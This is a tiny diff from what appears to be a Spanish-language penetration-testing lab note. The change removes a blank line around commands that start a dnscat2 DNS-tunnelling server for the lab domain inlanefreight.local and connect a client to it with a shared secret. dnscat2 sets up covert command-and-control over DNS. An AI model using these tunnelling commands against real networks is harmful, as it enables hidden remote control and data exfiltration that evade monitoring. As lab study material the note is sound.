@@ -134,7 +134,6 @@ Lo ejecuto desde la carpeta /dnscat2/server:
 sudo ruby dnscat2.rb --dns host=10.10.15.95 ,port=53,domain=inlanefreight.local --no-cache
 ```
 
-
 Y me devuelve tal secret: 
 ```
   ./dnscat --dns server=x.x.x.x,port=53 --secret=57f5c4615e94c4643822079b65083f94
